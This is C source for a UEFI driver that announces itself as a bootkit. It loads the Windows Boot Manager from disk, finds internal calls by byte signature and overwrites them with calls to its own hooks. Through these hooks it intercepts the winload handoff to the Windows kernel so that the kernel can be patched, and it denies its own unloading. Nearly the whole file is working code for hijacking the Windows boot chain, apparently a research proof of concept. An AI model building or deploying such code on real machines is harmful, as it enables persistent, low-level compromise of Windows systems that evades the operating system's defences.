﻿#include "drv.h"

//
// Libraries
//
#include <Library/DevicePathLib.h>
#include <Library/BaseMemoryLib.h>

//
// Protocols
//
#include <Protocol/SimpleFileSystem.h>

//
// Our includes
//
#include "utils.h"
#include "pe.h"
#include "imageldr.h"
#include "hook.h"

//
// We support unload (but deny it)
//
const UINT8 _gDriverUnloadImageCount = 1;

//
// We require at least UEFI 2.0
//
const UINT32 _gUefiDriverRevision = 0x200;
const UINT32 _gDxeRevision = 0x200;

//
// Our name
//
CHAR8 *gEfiCallerBaseName = "UefiDriver";

// Title
#define BOOTKIT_TITLE1		L"\r\n ██████╗ ██╗   ██╗██████╗ ███████╗███████╗ ██╗ █████╗  " \
							L"\r\n ██╔══██╗██║   ██║██╔══██╗██╔════╝╚════██║███║██╔══██╗ " \
							L"\r\n ██║  ██║██║   ██║██║  ██║█████╗      ██╔╝╚██║╚██████║ " 
#define BOOTKIT_TITLE2		L"\r\n ██║  ██║██║   ██║██║  ██║██╔══╝     ██╔╝  ██║ ╚═══██║ " \
							L"\r\n ██████╔╝╚██████╔╝██████╔╝███████╗   ██║   ██║ █████╔╝ " \
							L"\r\n ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝ ╚════╝  "

#define BOOTMGFW_EFI_PATH	L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi"

static EFI_HANDLE gWindowsImagehandle;


//
// Our ImgArchEfiStartBootApplication hook which takes the winload Image Base as a parameter so we can patch the kernel
//
EFI_STATUS EFIAPI hkImgArchEfiStartBootApplication( VOID* Parameters, VOID* ImageBase, UINT32 ImageSize, UINT8 BootOption, UINT64* SomeReturnValue )
{
	PIMAGE_NT_HEADERS NtHdr = NULL;

	// Restore original bytes to call
	CopyMem( ImgArchEfiStartBootApplicationPatchLocation, ImgArchEfiStartBootApplicationBackup, 5 );

	// Clear the screen
	gST->ConOut->ClearScreen( gST->ConOut );

	Print( L"Inside ImgArchEfiStartBootApplication\r\n" );

	Print( L"ImageBase = %lx\r\n", ImageBase );
	Print( L"ImageSize = %lx\r\n", ImageSize );

	NtHdr = ImageNtHeader( ImageBase );
	if (NtHdr != NULL)
	{
		EFI_STATUS EfiStatus = EFI_SUCCESS;
		UINT8* Found = NULL;

		VOID* ArchpChildAppEntryRoutine = (VOID*)((UINT8*)ImageBase + HEADER_VAL_T( NtHdr, AddressOfEntryPoint ));
		Print( L"ArchpChildAppEntryRoutine = %lx\r\n", ArchpChildAppEntryRoutine );		

		// Find right location to patch
		EfiStatus = UtilFindPattern( sigOslArchTransferToKernel, 0xCC, sizeof( sigOslArchTransferToKernel ), ImageBase, (UINT32)ImageSize, (VOID**)&Found );
		if (!EFI_ERROR( EfiStatus ))
		{
			Print( L"Found OslArchTransferToKernel call at %lx\r\n", Found );

			// Get original from call instruction
			oOslArchTransferToKernel = (tOslArchTransferToKernel)UtilCallAddress( Found );
			Print( L"OslArchTransferToKernel at %lx\r\n", oOslArchTransferToKernel );
			Print( L"OslArchTransferToKernelHook at %lx\r\n", &OslArchTransferToKernelHook );

			// Backup original function bytes before patching
			OslArchTransferToKernelPatchLocation = (VOID*)Found;
			CopyMem( (VOID*)OslArchTransferToKernelBackup, (VOID*)Found, 5 );

			// display original code
			Print( L"Original:\r\n" );
			UtilDisassembleCode( (UINT8*)Found, (VOID*)Found, 5 );

			// Do patching 
			*(UINT8*)Found = 0xE8;
			*(UINT32*)(Found + 1) = UtilCalcRelativeCallOffset( (VOID*)Found, (VOID*)&OslArchTransferToKernelHook );

			// Display patched code 
			Print( L"Patched:\r\n" );
			UtilDisassembleCode( (UINT8*)Found, (VOID*)Found, 5 );
		}
		else
		{
			Print( L"\r\nImgArchEfiStartBootApplication error, failed to find SetOslEntryPoint patch location. Status: %lx\r\n", EfiStatus );
		}
	}

	Print( L"Press any key to continue..." );
	UtilWaitForKey( );

	// Clear screen
	gST->ConOut->ClearScreen( gST->ConOut );

	return oImgArchEfiStartBootApplication( Parameters, ImageBase, ImageSize, BootOption, SomeReturnValue );
}

//
// Patch the Windows Boot Manager (bootmgfw.efi)
// 
EFI_STATUS PatchWindowsBootManager( IN VOID* LocalImageBase, IN EFI_HANDLE BootMgrHandle )
{
	EFI_STATUS EfiStatus = EFI_SUCCESS;
	EFI_LOADED_IMAGE *BootMgrImage = NULL;
	UINT8* Found = NULL;

	// Get Windows Boot Manager memory mapping data
	EfiStatus = gBS->HandleProtocol( BootMgrHandle, &gEfiLoadedImageProtocolGuid, (void **)&BootMgrImage );
	if (EFI_ERROR( EfiStatus ))
	{
		ErrorPrint( L"\r\nPatchWindowsBootManager error, failed to get Loaded Image info. Status: %lx\r\n", EfiStatus );
		return EfiStatus;
	}

	// Print Windows Boot Manager image info
	UtilPrintLoadedImageInfo( BootMgrImage );

	// Find right location to patch
	EfiStatus = UtilFindPattern( 
		sigImgArchEfiStartBootApplicationCall,
		0xCC, 
		sizeof( sigImgArchEfiStartBootApplicationCall ),
		BootMgrImage->ImageBase, 
		(UINT32)BootMgrImage->ImageSize, 
		(VOID**)&Found
	);
	if (!EFI_ERROR( EfiStatus ))
	{
		// Found address, now let's do our patching
		UINT32 NewCallRelative = 0;

		Print( L"Found ImgArchEfiStartBootApplication call at %lx\n", Found );

		// Save original call
		oImgArchEfiStartBootApplication = (tImgArchEfiStartBootApplication)UtilCallAddress( Found );
		// Backup original bytes and patch location before patching
		ImgArchEfiStartBootApplicationPatchLocation = (VOID*)Found;
		CopyMem( ImgArchEfiStartBootApplicationBackup, ImgArchEfiStartBootApplicationPatchLocation, 5 );
		// Patch call to jump to our hkImgArchEfiStartBootApplication hook
		NewCallRelative = UtilCalcRelativeCallOffset( (VOID*)Found, (VOID*)&hkImgArchEfiStartBootApplication );
		//Found
		*(UINT8*)Found = 0xE8; // Write call opcode
		*(UINT32*)(Found + 1) = NewCallRelative; // Write the new relative call offset
	}
	else
	{
		ErrorPrint( L"\r\nPatchWindowsBootManager error, failed to find Archpx64TransferTo64BitApplicationAsm patch location. Status: %lx\r\n", EfiStatus );
	}

	return EfiStatus;
}

// 
// Main entry point
// 
EFI_STATUS EFIAPI UefiMain( IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable )
{
	EFI_STATUS efiStatus;
	EFI_LOADED_IMAGE* Image;
	EFI_DEVICE_PATH* WinBootMgrDevicePath;

	// Clear screen
	gST->ConOut->ClearScreen( gST->ConOut );

	//
	// Install required driver binding components
	//
	efiStatus = EfiLibInstallDriverBindingComponentName2( ImageHandle, SystemTable, &gDriverBindingProtocol, ImageHandle, &gComponentNameProtocol, &gComponentName2Protocol );
	if (EFI_ERROR( efiStatus ))
		goto Exit;

	//
	// Print stuff out
	//
	Print( L"\r\n\r\n" );
	Print( L"%s", BOOTKIT_TITLE1 );
	Print( L"%s", BOOTKIT_TITLE2 );
	efiStatus = gBS->HandleProtocol( ImageHandle, &gEfiLoadedImageProtocolGuid, &Image );
	if (EFI_ERROR( efiStatus ))
		goto Exit;
	UtilPrintLoadedImageInfo( Image );

	//
	// Locate 
	//
	Print( L"Locating Windows UEFI Boot Manager... " );
	efiStatus = UtilLocateFile( BOOTMGFW_EFI_PATH, &WinBootMgrDevicePath );
	if (EFI_ERROR( efiStatus ))
		goto Exit;
	Print( L"Found!\r\n" );
	
	Print( L"Patching Windows Boot Manager... " );
	efiStatus = ImageLoad( ImageHandle, WinBootMgrDevicePath, &gWindowsImagehandle );
	if (EFI_ERROR( efiStatus ))
		goto Exit;
	efiStatus = PatchWindowsBootManager( Image->ImageBase, gWindowsImagehandle );
	if (EFI_ERROR( efiStatus ))
		goto Exit;
	Print( L"Patched!\r\n" );

	Print( L"\r\nPress any key to load Windows...\r\n" );
	UtilWaitForKey( );

	efiStatus = ImageStart( gWindowsImagehandle );
	if (EFI_ERROR( efiStatus ))
		goto Exit;

Exit:
	if (efiStatus != EFI_SUCCESS)
	{
		ErrorPrint( L"\r\nUEFI Runtime Driver failed with status: %lx\r\n", efiStatus );
	}

	return efiStatus;
}


// 
// Unload the driver
// 
EFI_STATUS EFIAPI UefiUnload( IN EFI_HANDLE ImageHandle )
{
	// Disable unloading
	return EFI_ACCESS_DENIED;
}